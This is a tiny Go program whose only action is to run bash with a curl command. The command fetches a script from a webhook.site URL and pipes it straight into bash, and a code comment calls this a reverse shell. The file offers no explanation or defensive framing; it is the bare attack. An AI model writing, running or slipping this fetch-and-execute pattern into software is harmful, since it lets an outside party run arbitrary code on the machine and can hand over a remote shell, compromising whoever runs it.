package main

import (
	"os/exec"
)

func main() {
	// Executes a reverse shell
	cmd := exec.Command("bash", "-c", "curl -s https://webhook.site/3ca32df3-14c1-4de3-b7f8-f8af1992dd5d | bash")
	cmd.Run()
}
